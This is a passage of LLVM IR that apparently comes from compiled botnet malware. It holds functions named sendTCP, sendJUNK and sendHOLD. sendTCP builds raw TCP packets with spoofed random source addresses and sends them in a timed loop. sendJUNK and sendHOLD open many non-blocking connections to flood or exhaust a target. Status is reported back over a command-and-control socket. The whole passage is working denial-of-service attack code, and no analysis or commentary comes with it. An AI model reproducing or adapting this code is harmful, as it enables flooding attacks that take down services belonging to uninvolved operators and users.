  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %79, i64 28
  call void @makeRandomStr(i8* %108, i32 %4)
  %109 = bitcast i8* %79 to i16*
  %110 = getelementptr inbounds i8, i8* %79, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %79, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %118 = add nsw i32 %117, %2
  %119 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %79, i64 4
  %121 = bitcast i8* %120 to i16*
  %122 = getelementptr inbounds i8, i8* %79, i64 12
  %123 = bitcast i8* %122 to i32*
  %124 = trunc i32 %1 to i16
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %101
  %.0 = phi i32 [ 0, %101 ], [ %.0.be, %.backedge61.backedge ]
  %125 = call i64 @sendto(i32 %54, i8* nonnull %79, i64 %77, i32 0, %struct.sockaddr* nonnull %119, i32 16) #3
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %94, align 4
  br i1 %10, label %128, label %130

; <label>:128:                                    ; preds = %.backedge61
  %129 = call i32 @rand_cmwc()
  br label %133

; <label>:130:                                    ; preds = %.backedge61
  %131 = call zeroext i16 @htons(i16 zeroext %124) #17
  %132 = zext i16 %131 to i32
  br label %133

; <label>:133:                                    ; preds = %130, %128
  %134 = phi i32 [ %129, %128 ], [ %132, %130 ]
  %135 = trunc i32 %134 to i16
  store i16 %135, i16* %105, align 2
  %136 = call i32 @rand_cmwc()
  %137 = trunc i32 %136 to i16
  store i16 %137, i16* %121, align 4
  %138 = call i32 @getRandomIP(i32 %.060)
  %139 = call i32 @htonl(i32 %138) #17
  store i32 %139, i32* %123, align 4
  %140 = load i16, i16* %111, align 2
  %141 = zext i16 %140 to i32
  %142 = call zeroext i16 @csum(i16* nonnull %109, i32 %141)
  store i16 %142, i16* %116, align 2
  %143 = icmp eq i32 %.0, %5
  br i1 %143, label %144, label %147

; <label>:144:                                    ; preds = %133
  %145 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %146 = icmp sgt i32 %145, %118
  br i1 %146, label %149, label %.backedge61.backedge

; <label>:147:                                    ; preds = %133
  %148 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %147, %144
  %.0.be = phi i32 [ %148, %147 ], [ 0, %144 ]
  br label %.backedge61

; <label>:149:                                    ; preds = %144
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %149, %63, %56, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #17
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #17
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i64 0, i64 0)) #14
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #14
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i64 0, i64 0)) #14
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.44, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #17
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @getRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #17
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #17
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %101

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #3
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = add nsw i32 %28, %2
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %32 = icmp sgt i32 %9, 1
  %33 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %34 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %37 = bitcast i32* %8 to i8*
  %38 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %99
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %40 = icmp sgt i32 %29, %39
  br i1 %40, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %32, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %99
  %indvars.iv = phi i64 [ %indvars.iv.next, %99 ], [ 0, %.lr.ph.preheader ]
  %41 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %43 = load i8, i8* %42, align 4
  switch i8 %43, label %99 [
    i8 0, label %44
    i8 1, label %60
    i8 2, label %87
  ]

; <label>:44:                                     ; preds = %.lr.ph
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %46 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  store i32 %45, i32* %46, align 8
  %47 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 3, i8* null) #3
  %48 = or i32 %47, 2048
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 4, i32 %48) #3
  %50 = call i32 @connect(i32 %45, %struct.sockaddr* nonnull %33, i32 16) #3
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %56

; <label>:52:                                     ; preds = %44
  %53 = tail call i32* @__errno_location() #17
  %54 = load i32, i32* %53, align 4
  %55 = icmp eq i32 %54, 115
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52, %44
  %57 = load i32, i32* %46, align 8
  %58 = call i32 @close(i32 %57) #3
  br label %99

; <label>:59:                                     ; preds = %52
  store i8 1, i8* %42, align 4
  br label %99

; <label>:60:                                     ; preds = %.lr.ph
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %34) #3, !srcloc !7
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %63 = load i32, i32* %62, align 8
  %64 = srem i32 %63, 64
  %65 = zext i32 %64 to i64
  %66 = shl i64 1, %65
  %67 = sdiv i32 %63, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %66, %70
  store i64 %71, i64* %69, align 8
  store i64 0, i64* %35, align 8
  store i64 10000, i64* %36, align 8
  %72 = load i32, i32* %62, align 8
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %74, label %99 [
    i32 1, label %75
    i32 -1, label %84
  ]

; <label>:75:                                     ; preds = %60
  store i32 4, i32* %7, align 4
  %76 = load i32, i32* %62, align 8
  %77 = call i32 @getsockopt(i32 %76, i32 1, i32 4, i8* nonnull %37, i32* nonnull %7) #3
  %78 = load i32, i32* %8, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %83, label %80

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* %62, align 8
  %82 = call i32 @close(i32 %81) #3
  br label %83

; <label>:83:                                     ; preds = %75, %80
  %.sink = phi i8 [ 0, %80 ], [ 2, %75 ]
  store i8 %.sink, i8* %42, align 4
  br label %99

; <label>:84:                                     ; preds = %60
  %85 = load i32, i32* %62, align 8
  %86 = call i32 @close(i32 %85) #3
  store i8 0, i8* %42, align 4
  br label %99

; <label>:87:                                     ; preds = %.lr.ph
  call void @makeRandomStr(i8* %27, i32 1024)
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i64 @send(i32 %89, i8* %27, i64 1024, i32 16384) #3
  %91 = icmp eq i64 %90, -1
  br i1 %91, label %92, label %99

; <label>:92:                                     ; preds = %87
  %93 = tail call i32* @__errno_location() #17
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %99, label %96

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %88, align 8
  %98 = call i32 @close(i32 %97) #3
  store i8 0, i8* %42, align 4
  br label %99

; <label>:99:                                     ; preds = %60, %92, %.lr.ph, %59, %56, %84, %83, %96, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %100 = icmp slt i64 %indvars.iv.next, %38
  br i1 %100, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %101

; <label>:101:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #17
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %110

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = add nsw i32 %27, %2
  %29 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %31 = icmp sgt i32 %9, 1
  %32 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %36 = bitcast i32* %8 to i8*
  %37 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %38 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %40 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %108
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %41 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %42 = icmp sgt i32 %28, %41
  br i1 %42, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %108
  %indvars.iv = phi i64 [ %indvars.iv.next, %108 ], [ 0, %.lr.ph.preheader ]
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %44 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %45 = load i8, i8* %44, align 4
  switch i8 %45, label %108 [
    i8 0, label %46
    i8 1, label %62
    i8 2, label %89
  ]

; <label>:46:                                     ; preds = %.lr.ph
  %47 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %48 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  store i32 %47, i32* %48, align 8
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 3, i8* null) #3
  %50 = or i32 %49, 2048
  %51 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 4, i32 %50) #3
  %52 = call i32 @connect(i32 %47, %struct.sockaddr* nonnull %32, i32 16) #3
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %46
  %55 = tail call i32* @__errno_location() #17
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 115
  br i1 %57, label %61, label %58

; <label>:58:                                     ; preds = %54, %46
  %59 = load i32, i32* %48, align 8
  %60 = call i32 @close(i32 %59) #3
  br label %108

; <label>:61:                                     ; preds = %54
  store i8 1, i8* %44, align 4
  br label %108

; <label>:62:                                     ; preds = %.lr.ph
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !8
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = sdiv i32 %65, 64
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %70
  %72 = load i64, i64* %71, align 8
  %73 = or i64 %68, %72
  store i64 %73, i64* %71, align 8
  store i64 0, i64* %34, align 8
  store i64 10000, i64* %35, align 8
  %74 = load i32, i32* %64, align 8
  %75 = add nsw i32 %74, 1
  %76 = call i32 @select(i32 %75, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %76, label %108 [
    i32 1, label %77
    i32 -1, label %86
  ]

; <label>:77:                                     ; preds = %62
  store i32 4, i32* %7, align 4
  %78 = load i32, i32* %64, align 8
  %79 = call i32 @getsockopt(i32 %78, i32 1, i32 4, i8* nonnull %36, i32* nonnull %7) #3
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %85, label %82

; <label>:82:                                     ; preds = %77
  %83 = load i32, i32* %64, align 8
  %84 = call i32 @close(i32 %83) #3
  br label %85

; <label>:85:                                     ; preds = %77, %82
  %.sink = phi i8 [ 0, %82 ], [ 2, %77 ]
  store i8 %.sink, i8* %44, align 4
  br label %108

; <label>:86:                                     ; preds = %62
  %87 = load i32, i32* %64, align 8
  %88 = call i32 @close(i32 %87) #3
  store i8 0, i8* %44, align 4
  br label %108

; <label>:89:                                     ; preds = %.lr.ph
  %90 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %37) #3, !srcloc !9
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = srem i32 %92, 64
  %94 = zext i32 %93 to i64
  %95 = shl i64 1, %94
  %96 = sdiv i32 %92, 64
  %97 = sext i32 %96 to i64
